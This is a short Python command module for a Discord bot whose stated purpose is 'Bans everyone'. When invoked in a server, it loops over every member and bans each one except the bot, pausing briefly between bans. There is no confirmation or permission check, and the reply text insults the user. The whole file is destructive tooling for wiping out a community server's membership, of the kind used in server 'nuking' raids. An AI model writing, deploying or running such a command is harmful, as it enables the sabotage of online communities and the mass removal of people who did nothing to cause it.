import time,asyncio
from Backbone import discord
def help():
  return "Bans everyone"
async def exec(req):
  if not hasattr(req,"guild"):
    await req.reply("Must be ran on a guild idiot")
    return
  for member in req.guild.members:
    if member.id != discord.client.user.id:
      asyncio.create_task(req.guild.ban(member))
      time.sleep(0.1)
